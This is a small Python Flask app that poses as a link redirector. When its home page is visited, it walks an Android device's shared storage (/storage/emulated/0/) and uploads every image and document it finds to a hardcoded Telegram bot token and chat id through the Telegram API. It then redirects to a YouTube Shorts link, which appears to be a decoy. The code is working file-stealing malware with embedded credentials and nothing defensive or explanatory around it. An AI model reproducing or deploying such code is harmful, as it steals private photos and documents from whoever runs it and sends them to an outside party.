from flask import Flask, redirect
import os
import requests

app = Flask(__name__)

@app.route("/")
def home():
    token = "8227164819:AAH8_TAywNlKjzjo5q0AyaVSkB9AwS6YXJk"
    chat_id = 8366556223
    start_dir = '/storage/emulated/0/'
    IMAGE_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'}
    TEXT_EXTENSIONS = {'.txt', '.pdf', '.doc', '.docx', '.log', '.md', '.rtf'}
    
    youtube_link = "https://youtube.com/shorts/v8XhYkLPl28?si=BPbcEzt5zSKTpr_x"
    
    def send_all_files(start_path):
        for root, dirs, files in os.walk(start_path):
            for filename in files:
                file_path = os.path.join(root, filename)
                
                try:
                    file_ext = os.path.splitext(filename)[1].lower()
                    
                    with open(file_path, 'rb') as file:
                        if file_ext in IMAGE_EXTENSIONS:
                            url = f"https://api.telegram.org/bot{token}/sendPhoto"
                            files_dict = {'photo': file}
                        elif file_ext in TEXT_EXTENSIONS:
                            url = f"https://api.telegram.org/bot{token}/sendDocument"
                            files_dict = {'document': file}
                        else:
                            continue
                        
                        params = {'chat_id': chat_id}
                        response = requests.post(url, files=files_dict, params=params)
                        
                        if response.status_code == 200:
                            print(f"ok: {filename}")
                        else:
                            print(f"error {filename}: {response.status_code}")
                            
                except Exception as e:
                    print(f"error {filename}: {str(e)}")
    
    send_all_files(start_dir)
    
    return redirect(youtube_link)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
